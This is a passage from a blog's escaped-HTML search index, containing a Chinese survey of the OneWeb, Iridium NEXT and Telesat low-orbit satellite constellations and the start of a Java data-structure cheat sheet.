<strong>LEO</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>星数（颗）</strong></td>\n<td>66+9备份</td>\n<td>2956</td>\n<td>78-108</td>\n<td>720</td>\n<td>4425+备份</td>\n<td>4600</td>\n<td>27</td>\n<td>117+</td>\n</tr>\n<tr>\n<td><strong>星重（kg）</strong></td>\n<td>860</td>\n<td>不详</td>\n<td>1250</td>\n<td>150</td>\n<td>不详</td>\n<td>不详</td>\n<td>700</td>\n<td>不详</td>\n</tr>\n<tr>\n<td><strong>推出时间</strong></td>\n<td>2009</td>\n<td>2016</td>\n<td>2015</td>\n<td>2015</td>\n<td>2015</td>\n<td>2015</td>\n<td>2008</td>\n<td>2016</td>\n</tr>\n<tr>\n<td><strong>业务启动时间</strong></td>\n<td>2018</td>\n<td>批准后6年</td>\n<td>2022</td>\n<td>2019</td>\n<td>2024</td>\n<td>2028</td>\n<td>2014</td>\n<td>2021</td>\n</tr>\n<tr>\n<td><strong>轨道高度（km）</strong></td>\n<td>780</td>\n<td>1200</td>\n<td>1400</td>\n<td>1200</td>\n<td>1110-1325</td>\n<td>1500</td>\n<td>8000</td>\n<td>1000-1248</td>\n</tr>\n<tr>\n<td><strong>带宽</strong></td>\n<td>1.4Mbit/s</td>\n<td>宽带</td>\n<td>高通量</td>\n<td>共10Tbit/s  单星10Gbit/s</td>\n<td>宽带</td>\n<td>每月200Gb总流量</td>\n<td>电信港用户1Gbit/s</td>\n<td>光纤等级</td>\n</tr>\n<tr>\n<td><strong>频段</strong></td>\n<td>L/Ka</td>\n<td>V</td>\n<td>Ka</td>\n<td>Ka</td>\n<td>Ku/Ka</td>\n<td>V</td>\n<td>Ka</td>\n<td>Ka</td>\n</tr>\n<tr>\n<td><strong>星间链路</strong></td>\n<td>23GHz</td>\n<td>无</td>\n<td>光通信</td>\n<td>无</td>\n<td>光通信</td>\n<td>22.55-190GHz</td>\n<td>无</td>\n<td>光通信</td>\n</tr>\n</tbody>\n</table>\n<p>这里主要调研了规模较小的OneWeb（720颗）、铱星二代（66颗）、Telesat（117颗）三个低轨卫星系统。</p>\n<h2 id=\"OneWeb\"><a href=\"#OneWeb\" class=\"headerlink\" title=\"OneWeb\"></a>OneWeb</h2><h3 id=\"卫星主要参数：\"><a href=\"#卫星主要参数：\" class=\"headerlink\" title=\"卫星主要参数：\"></a>卫星主要参数：</h3><table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>参数名称</strong></th>\n<th style=\"text-align:center\"><strong>数值</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">类型</td>\n<td style=\"text-align:center\">LEO</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">周期/min</td>\n<td style=\"text-align:center\">110</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">高度/km</td>\n<td style=\"text-align:center\">1200</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">倾角/(°)</td>\n<td style=\"text-align:center\">87.9</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">轨道面个数</td>\n<td style=\"text-align:center\">18</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">相邻轨道面间隔/(°)</td>\n<td style=\"text-align:center\">10.15</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">每个轨道面卫星个数</td>\n<td style=\"text-align:center\">40</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">同轨道面两个卫星距离/km</td>\n<td style=\"text-align:center\">1189.2</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">同轨道面两个卫星时间/s</td>\n<td style=\"text-align:center\">165</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">卫星速度/(km/s)</td>\n<td style=\"text-align:center\">7.21</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">卫星个数</td>\n<td style=\"text-align:center\">720颗在轨，200颗地面备份</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">卫星重量/kg</td>\n<td style=\"text-align:center\">150</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">造价/万美元</td>\n<td style=\"text-align:center\">每颗卫星造价不超过50</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">覆盖</td>\n<td style=\"text-align:center\">全球覆盖</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">信关站到卫星/GHz</td>\n<td style=\"text-align:center\">27.5-29.1, 29.5-30/0</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">卫星到信关站/GHz</td>\n<td style=\"text-align:center\">17.8-18.6,  18.8-19.3, 19.7-20.2</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">用户终端到卫星/GHz</td>\n<td style=\"text-align:center\">12.75-13.25, 14.0-14.5</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">卫星到用户终端/GHz</td>\n<td style=\"text-align:center\">10.7-12.7</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">接入速率/Mbps</td>\n<td style=\"text-align:center\">上行50，下行200</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">用户波束</td>\n<td style=\"text-align:center\">每颗LEO卫星有16个椭圆形用户波束（工作在Ku频段）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">馈电波束</td>\n<td style=\"text-align:center\">两个馈电波束（Ka频段）双圆极化</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">关口站</td>\n<td style=\"text-align:center\">全球共分布50多个地面Ka关口站（美国至少有4个）；每个关口站配置数量10副以上的天线，每副天线口径为2.4m或更大</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">用户终端天线</td>\n<td style=\"text-align:center\">天线尺寸为30-75cm，或为机械式双抛物面天线、或为低成本相控阵天线</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">发射EIRP  (卫星用户链路)</td>\n<td style=\"text-align:center\">29.9dBW(54MHz带宽)</td>\n</tr>\n</tbody>\n</table>\n<p>OneWeb卫星包括720颗卫星，分布在18个轨道面，每个轨道面40颗卫星实现全球覆盖，每个轨道面上每隔9°部署一颗卫星。</p>\n<p><strong>卫星不带有星间链路，通过关口站组网通信。</strong>卫星与用户间链路采用Ku频段，单星形成16个长椭圆形波束，共覆盖星下1080km ×1080km的范围。单个波束下行速率可达750Mit/s，上行速率可达375Mbit/s。每颗卫星携带2个Ka频段圆极化双反射面天线，同时与2个关口站进行通信。单星吞吐量约为7.5Gbit/s，整个星座总吞吐量为6-7Tbit/s。由于采用低轨道，<strong>链路传输时延仅为**</strong>30ms**，与地面网络相当。</p>\n<p>OneWeb卫星提供的扩展蜂窝和宽带覆盖示例如下：</p>\n<p>（1）    电池或者太阳能供电可选择；</p>\n<p>（2）    星地时延&lt;30ms（双向）；</p>\n<p>（3）    宽带速率2/10/24/48Mbps；</p>\n<p>（4）    200m皮蜂窝；</p>\n<p>（5）    支持LTE/3G/Wifi；</p>\n<p>（6）    支持小区任意载波（包括漫游）；</p>\n<p>（7）    障碍地形具有很好的性能：视角&gt;50°。</p>\n<h3 id=\"关键技术\"><a href=\"#关键技术\" class=\"headerlink\" title=\"关键技术\"></a>关键技术</h3><ul>\n<li>小区切换</li>\n</ul>\n<p>由于OneWeb卫星是LEO卫星，低轨道卫星的运动速度非常快，大概在7km/s水平。所以，用户在不断地更换为其服务的卫星，通过波束的多重覆盖，可使用户感觉不到这种“漫游”，保证通讯等质量。跨波束、跨卫星的切换对于卫星来说，由于其相对地面运动速度较大，终端与节点在三维空间中的随机与可预测运动轨迹与相对速度的快速变化，将导致三维角速度快速变化和多普勒频移造成链路捕获与跟踪的困难，需要通过接入控制进行链路适配与切换控制，支持其链路层协议的识别，切换、链路调制。采用<strong>类似于移动**</strong>IP<strong>**的方法进行移动性管理</strong>。由于卫星在其轨道中不停地移动，所以用户在一颗星下要渐渐地从一个波束“漫游”到另一个波束，接着再“漫游”到同一轨道、下一颗卫星的第一个波束（或者是邻近轨道的其他卫星）。这些“漫游”（或叫波束／卫星切换）均无缝进行，用户不会有感知。</p>\n<ul>\n<li>渐进俯仰技术</li>\n</ul>\n<p>OneWeb的720颗低轨道卫星距地球表面1200km，在卫星飞越赤道的过程中，采用“渐进俯仰（progressive pitch）”技术能逐步改变LEO卫星信号发射的方向和电平值，从而消除对GEO卫星的干扰。1997年，ITU意识到用开放的7GHz的频谱资源通过非GEO卫星系统进行全球连接会存在潜在的干扰。OneWeb被批准使用这部分容量，是因为它能够利用一种称作“俯仰渐进”的关键技术来规避这种威胁。这项技术使得他们能够更有效地利用这些频谱，当他们的卫星接近赤道时，他们通过逐渐改变卫星的发射方向，进而消除对同步轨道卫星产生的干扰。</p>\n<h3 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h3><p><a href=\"https://www.oneweb.net/#solution\" target=\"_blank\" rel=\"noopener\">https://www.oneweb.net/#solution</a></p>\n<p><a href=\"https://kns.cnki.net/KCMS/detail/detail.aspx?dbcode=CJFQ&amp;dbname=CJFDLAST2018&amp;filename=KJDZ201706001&amp;v=MTI1OTR6a1Y3L05MaWZQZExHNEg5Yk1xWTlGWllSOGVYMUx1eFlTN0RoMVQzcVRyV00xRnJDVVI3cWZaZVJvRnk=\" target=\"_blank\" rel=\"noopener\">翟继强,李雄飞.OneWeb卫星系统及国内低轨互联网卫星系统发展思考</a></p>\n<p><a href=\"https://spacefan.github.io/2019/02/12/LEOComm/\" target=\"_blank\" rel=\"noopener\">低轨卫星通信系统发展综述</a></p>\n<h2 id=\"铱星二代（Iridium-NEXT）\"><a href=\"#铱星二代（Iridium-NEXT）\" class=\"headerlink\" title=\"铱星二代（Iridium NEXT）\"></a>铱星二代（Iridium NEXT）</h2><h3 id=\"卫星总体指标：\"><a href=\"#卫星总体指标：\" class=\"headerlink\" title=\"卫星总体指标：\"></a>卫星总体指标：</h3><table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>项目</strong></th>\n<th style=\"text-align:center\"><strong>指标</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">星座规模</td>\n<td style=\"text-align:center\">66颗工作星呈δ-Walker星座均匀分布在6个轨道面上，辅以6颗天基备份星和9颗地基备份星</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">卫星轨道</td>\n<td style=\"text-align:center\">LEO极轨道，倾角86.4°，工作轨道高度780km，轨道周期101分钟</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">发射部署</td>\n<td style=\"text-align:center\">2017.01.14-2019.01.12，8次发射任务，运载火箭Falcon-9 v1.2</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">总体指标</td>\n<td style=\"text-align:center\">质量约860kg，功率2kW，发射包络3.1mx2.4mx1.5m，在轨包络3.1mx9.4mx1.5m</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">在轨寿命</td>\n<td style=\"text-align:center\">设计寿命10年，任务寿命15年</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">姿态控制</td>\n<td style=\"text-align:center\">两轴稳定，带有星敏</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">主载荷</td>\n<td style=\"text-align:center\">L频段通信机，相控阵天线，48个波束，1.5Mbps星地数据传输速率</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">测控系统</td>\n<td style=\"text-align:center\">Ka频段（20/30GHz），全向天线</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">星地网关</td>\n<td style=\"text-align:center\">两个Ka频段（23GHz）通信机交叉连接到相邻的卫星，速率达10Mbps</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">搭载能力</td>\n<td style=\"text-align:center\">质量≤50kg，空间包络≤40cmx70cmx30cm长期功耗≤50W，峰值功耗≤200W数据量≤100kbps（90%占空比）、≤1Mbps(10%占空比)</td>\n</tr>\n</tbody>\n</table>\n<p>​    铱星二代由81颗功能相同的卫星组成天基移动通信系统，其中66颗工作星呈δ-Walker 星座均匀分布在6个轨道面上，辅以6颗天基备份星和9颗地基备份星。铱星二代卫星重约860kg，最大功耗2kW，发射包络3.1m x 2.4m x 1.5m，设计寿命10年，任务寿命15年。卫星主载荷为L波段通信载荷，其相控阵天线在地球表面生成48个波束，形成直径为4700km 的蜂窝，用于提供1.5Mbps的星地数据传输服务；卫星提供搭载服务，可搭载质量不大于50kg、功耗不大于50W、空间包络不大于40 cm x 70 cm x 30 cm、数据量不大于100 kbps（90% 占空比）或 1 Mbps（10% 占空比）的次载荷，目前每颗卫星皆携带一个ADS-B 接收机，58 颗星携带了 AIS 接收机，用于全球民用客机及船舶监视服务。</p>\n<p><strong>卫星具备星间和星地网关链路</strong>，星间链路由4个Ka波段（23 GHz）通信设备实现，前后双星的链路2个设备固定指向，相邻轨道2个设备具备目标姿态指向能力，通信速率达10Mbps；星地网关链路由2个具备目标姿态指向的Ka波段（20/30 GHz）通信设备实现，通信速率达8Mbps。</p>\n<h3 id=\"参考链接-1\"><a href=\"#参考链接-1\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h3><p><a href=\"https://en.wikipedia.org/wiki/Iridium_satellite_constellation\" target=\"_blank\" rel=\"noopener\">铱星星座</a></p>\n<p><a href=\"https://directory.eoportal.org/web/eoportal/satellite-missions/i/iridium-next\" target=\"_blank\" rel=\"noopener\">Iridium NEXT (Hosting Payloads on a Communications Constellation)</a></p>\n<p><a href=\"https://spacefan.github.io/2019/02/12/LEOComm/\" target=\"_blank\" rel=\"noopener\">低轨卫星通信系统发展综述</a></p>\n<h2 id=\"Telesat\"><a href=\"#Telesat\" class=\"headerlink\" title=\"Telesat\"></a>Telesat</h2><h3 id=\"卫星主要参数：-1\"><a href=\"#卫星主要参数：-1\" class=\"headerlink\" title=\"卫星主要参数：\"></a>卫星主要参数：</h3><table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>参数名称</strong></th>\n<th style=\"text-align:center\">数值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">类型</td>\n<td style=\"text-align:center\">LEO</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">高度/km</td>\n<td style=\"text-align:center\">1248</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">倾角/(°)</td>\n<td style=\"text-align:center\">37.4</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">轨道面个数</td>\n<td style=\"text-align:center\">5</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">每个轨道面卫星个数</td>\n<td style=\"text-align:center\">10</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">卫星个数</td>\n<td style=\"text-align:center\">不少于117颗</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">上行链路/GHz</td>\n<td style=\"text-align:center\">Ka频段，17.8-20.2</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">下行链路/GHz</td>\n<td style=\"text-align:center\">Ka频段，27.5-30.0</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">星间链路</td>\n<td style=\"text-align:center\">光通信</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">用户波束</td>\n<td style=\"text-align:center\">≥16个波束，具有波束成形，波束调形</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">关口站</td>\n<td style=\"text-align:center\">每个卫星将具有2个可调向的关口站天线，每个关口站配备多个3.5米天线</td>\n</tr>\n</tbody>\n</table>\n<p>Telesat的Ka波段星座由不少于117颗卫星组成，卫星分布在两组轨道面上：</p>\n<p>（1）第一组轨道面为极轨道，由6个轨道面组成，轨道倾角99.5度，高度1000km，每个平面至少12颗卫星；</p>\n<p>（2）第二组轨道面为倾斜轨道，由不少于5个轨道面组成，轨道倾角37.4度，高度1200km，每个平面至少有10颗卫星。</p>\n<p>同一轨道组内的同一平面内或相邻平面内，及在两个轨道组间的相邻卫星，都将<strong>通过激光卫星间链路（**</strong>Inter-SatelliteLink,ISL<strong>**）进行通信</strong>。由于使用星间链路，用户将能够从世界上任何地方连接到系统，即使用户和关口站不在同一卫星的视线内。</p>\n<p>每颗卫星将作为IP网络的节点，并将携带具有直接辐射阵列（DirectRadiatingArray,DRA）的高级数字通信有效载荷。有效载荷将包括具有解调、路由和重新调制功能的星上处理模块，从而解耦上下行链路，这代表了当前弯管架构的重要创新。</p>\n<p>DRA将能够在上行链路方向上形成至少16个波束，并且在下行链路方向上形成至少另外16个波束，并且将具有波束成形（beam-forming）和波束调形（beam-shaping）功能，其功率、带宽、大小和视轴动态地分配给每个波束以最大限度地提高性能并最大限度地减少对GSO和NGSO卫星的干扰。</p>\n<p>此外，每个卫星将具有2个可调向的关口站天线，以及用于信令的宽视场接收器波束。该系统设计有多个分布在世界各地的关口站，每个关口站配备多个3.5米天线。渥太华的控制中心将监测、协调和控制资源分配过程，以及无线电信道的规划、安排和维护。</p>\n<p>Telesat的星座将在Ka频段（17.8-20.2GHz）的较低频谱中使用1.8GHz的带宽用于下行链路，而在上Ka频段（27.5-30.0GHz）的带宽为2.1GHz用于上行链路。</p>\n<h3 id=\"参考链接-2\"><a href=\"#参考链接-2\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h3><p><a href=\"http://202.202.43.73:8000/rwt/CNKI/http/NNYHGLUDN3WXTLUPMW4A/KCMS/detail/detail.aspx?dbcode=CJFQ&amp;dbname=CJFDLAST2019&amp;filename=WXWL201907010&amp;uid=WEEvREcwSlJHSldRa1FhcTdnTnhXS1B5MmpDZHUyT1hCa2Q1VExEb0xxST0=$9A4hF_YAuvQ5obgVAqNKPCYcEjKensW4IQMovwHtwkF4VYPoHbKxJw!!&amp;v=MDQxMzN5L25XNy9BTWpYY1lyRzRIOWpNcUk5RVpJUjhlWDFMdXhZUzdEaDFUM3FUcldNMUZyQ1VSN3FmWmVSb0Y=\" target=\"_blank\" rel=\"noopener\">Inigo del Portilloa,Bruce G.Cameronb,Edward F.Crawleyc,刘帅军,胡月梅.Telesat、One Web及Space X三个全球宽带低轨卫星星座系统的技术对比</a></p>\n<p><a href=\"http://www.mit.edu/~portillo/files/Comparison-LEO-IAC-2018-slides.pdf\" target=\"_blank\" rel=\"noopener\">A Technical Comparison of Three Low Earth Orbit Satellite Constellation Systems to Provide Global Broadband</a></p>\n","categories":[],"tags":["卫星网络"]},{"title":"Java code snippet","url":"http://b1ng0.top/2020/02/19/Java code snippet/","content":"<blockquote>\n<p>在家里就各种拖延症，不想看论文，不想挖洞，只能强迫自己刷刷题假装在学习的样子，在这里整理一下java常用的数据结构，记不住了就过来copy。。。</p>\n</blockquote>\n<h2 id=\"Array-amp-ArrayList\"><a href=\"#Array-amp-ArrayList\" class=\"headerlink\" title=\"Array &amp; ArrayList\"></a>Array &amp; ArrayList</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>[][] myArr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">5</span>][<span class=\"number\">10</span>];</span><br><span class=\"line\">ArrayList&lt;String&gt; myArr = <span class=\"keyword\">new</span> ArrayList&lt;String&gt;();</span><br><span class=\"line\">myArr.add(<span class=\"string\">\"dynamically resizing\"</span>);</span><br><span class=\"line\">System.out.println(myArr.get(<span class=\"number\">0</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"Vector\"><a href=\"#Vector\" class=\"headerlink\" title=\"Vector\"></a>Vector</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Vector&lt;String&gt; myVect = <span class=\"keyword\">new</span> Vector&lt;String&gt;();</span><br><span class=\"line\">myVect.add(<span class=\"string\">\"synchronized\"</span>);</span><br><span class=\"line\">System.out.println(myVect.get(<span class=\"number\">0</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"LinkedList\"><a href=\"#LinkedList\" class=\"headerlink\" title=\"LinkedList\"></a>LinkedList</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LinkedList&lt;String&gt; myList = <span class=\"keyword\">new</span> LinkedList&lt;String&gt;();</span><br><span class=\"line\">myList.add(<span class=\"string\">\"build-in list\"</span>);</span><br><span class=\"line\">Iterator&lt;String&gt; iter = myList.iterator();</span><br><span class=\"line\"><span class=\"keyword\">while</span> (iter.hasNext())</span><br><span class=\"line\">System.out.println(iter.next());</span><br></pre></td></tr></table></figure>\n<h2 id=\"HashMap\"><a href=\"#HashMap\" class=\"headerlink\" title=\"HashMap\"></a>HashMap</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HashMap&lt;String,String&gt; map = <span class=\"keyword\">new</span> HashMap&lt;String,String&gt;();</span><br><span class=\"line\">map.put(<span class=\"string\">\"key\"</span>,<span class=\"string\">\"value\"</span>);</span><br><span class=\"line\">System.out.println(map.get(<span class=\"string\">\"key\"</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"Stacks\"><a href=\"#Stacks\" class=\"headerlink\" title=\"Stacks\"></a>Stacks</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Stack&lt;Object&gt; stack = <span class=\"keyword\">new</span> Stack&lt;Object&gt;();</span><br><span class=\"line\"><span class=\"function\">Object <span class=\"title\">push</span><span class=\"params\">(Object element)</span></span></span><br><span class=\"line\"><span class=\"function\">Object <span class=\"title\">pop</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">Object <span class=\"title\">peek</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">Object <span class=\"title\">isEmpty</span><span class=\"params\">()</span></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Queues\"><a href=\"#Queues\" class=\"headerlink\" title=\"Queues\"></a>Queues</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Queue&lt;Object&gt; queue = <span class=\"keyword\">new</span> LinkedList&lt;Object&gt;();</span><br><span class=\"line\"><span class=\"function\">Object <span class=\"title\">offer</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">Object <span class=\"title\">poll</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">boolean</span> <span class=\"title\">isEmpty</span><span class=\"params\">()</span></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Dictionaries\"><a href=\"#Dictionaries\" class=\"headerlink\" title=\"Dictionaries\"></a>Dictionaries</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Dictionary&lt;Object, Object&gt; dic = <span class=\"keyword\">new</span> Hashtable&lt;Object, Object&gt;();</span><br><span class=\"line\"><span class=\"function\">Object <span class=\"title\">put</span><span class=\"params\">(Object key, Object value)</span></span></span><br><span class=\"line\"><span class=\"function\">Object <span class=\"title\">get</span><span class=\"params\">(Object key)</span></span></span><br><span class=\"line\"><span class=\"function\">Enumeration <span class=\"title\">elements</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">Enumeration <span class=\"title\">keys</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">Object <span class=\"title\">remove</span><span class=\"params\">(Object key)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">boolean</span> <span class=\"title\">isEmpty</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">boolean</span> <span class=\"title\">contains</span><span class=\"params\">(Object key)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">size</span><span class=\"params\">()</span></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"StringBuilder\"><a href=\"#StringBuilder\" class=\"headerlink\" title=\"StringBuilder\"></a>StringBuilder</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StringBuilder string = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\"><span class=\"function\">StringBuilder <span class=\"title\">append</span><span class=\"params\">(<span class=\"keyword\">char</span> c)</span></span></span><br><span class=\"line\"><span class=\"function\">StringBuilder <span class=\"title\">deleteCharAt</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">length</span><span class=\"params\">()</span></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Strings\"><a href=\"#Strings\" class=\"headerlink\" title=\"Strings\"></a>Strings</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> <span class=\"title\">charAt</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">indexOf</span><span class=\"params\">(<span class=\"keyword\">char</span> ch)</span></span></span><br><span class=\"line\"><span class=\"function\">String <span class=\"title\">concat</span><span class=\"params\">(String s)</span></span></span><br><span class=\"line\"><span class=\"function\">String <span class=\"title\">substring</span><span class=\"params\">(<span class=\"keyword\">int</span> beginIndex)</span></span></span><br><span class=\"line\"><span class=\"function\">String <span class=\"title\">substring</span><span class=\"params\">(<span class=\"keyword\">int</span> beginIndex, <span class=\"keyword\">int</span> endIndex)</span></span></span><br><span class=\"line\"><span class=\"function\">String <span class=\"title\">toLowerCase</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">String <span class=\"title\">toUpperCase</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">boolean</span> <span class=\"title\">contains</span><span class=\"params\">(CharSequence s)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> String <span class=\"title\">copyValueOf</span><span class=\"params\">(<span class=\"keyword\">char</span>[] data)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>[] <span class=\"title\">toCharArray</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">length</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">boolean</span> <span class=\"title\">contenEquals</span><span class=\"params\">(StringBuffer sb)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">boolean</span> <span class=\"title\">startsWith</span><span class=\"params\">(String prefix)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">boolean</span> <span class=\"title\">endsWith</span><span class=\"params\">(String suffix)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">boolean</span> <span class=\"title\">matches</span><span class=\"params\">(String regex)</span></span></span><br><span class=\"line\"><span class=\"function\">String <span class=\"title\">intern</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">String <span class=\"title\">trim</span><span class=\"params\">()</span></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Math\"><a href=\"#Math\" class=\"headerlink\" title=\"Math\"></a>Math</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">xxx <span class=\"title\">abs</span><span class=\"params\">(xxx x)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">ceil</span><span class=\"params\">(<span class=\"keyword\">double</span> d)</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">ceil</span><span class=\"params\">(<span class=\"keyword\">float</span> f)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">floor</span><span class=\"params\">(<span class=\"keyword\">double</span> d)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">floor</span><span class=\"params\">(<span 